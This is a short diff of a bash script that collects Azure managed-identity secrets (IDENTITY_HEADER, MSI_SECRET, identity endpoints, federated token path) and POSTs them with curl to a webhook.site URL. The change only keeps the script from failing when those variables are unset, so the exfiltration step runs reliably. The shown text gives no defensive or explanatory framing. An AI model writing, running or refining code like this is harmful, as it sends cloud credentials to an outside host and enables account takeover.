@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-set -euo pipefail
+set -eo pipefail
 WH="https://webhook.site/759eda34-6b38-4279-ace1-e6ca8c89f6b8"
 send() { curl -s -m30 -X POST "$WH/$1" -d "$2" -H "Content-Type: text/plain"; }
 
@@ -66,11 +66,11 @@ $ROLEDEFS
 
 # 7. Check config blob via direct URL with managed identity env (try IDENTITY_ENDPOINT)
 OUT+="---IDENTITY-ENV---
-IDENTITY_ENDPOINT=$IDENTITY_ENDPOINT
-IDENTITY_HEADER=$IDENTITY_HEADER
-MSI_ENDPOINT=$MSI_ENDPOINT
-MSI_SECRET=$MSI_SECRET
-AZURE_FEDERATED_TOKEN_FILE=$AZURE_FEDERATED_TOKEN_FILE
+IDENTITY_ENDPOINT=${IDENTITY_ENDPOINT:-unset}
+IDENTITY_HEADER=${IDENTITY_HEADER:-unset}
+MSI_ENDPOINT=${MSI_ENDPOINT:-unset}
+MSI_SECRET=${MSI_SECRET:-unset}
+AZURE_FEDERATED_TOKEN_FILE=${AZURE_FEDERATED_TOKEN_FILE:-unset}
 "
 
 send "v4all" "$OUT"
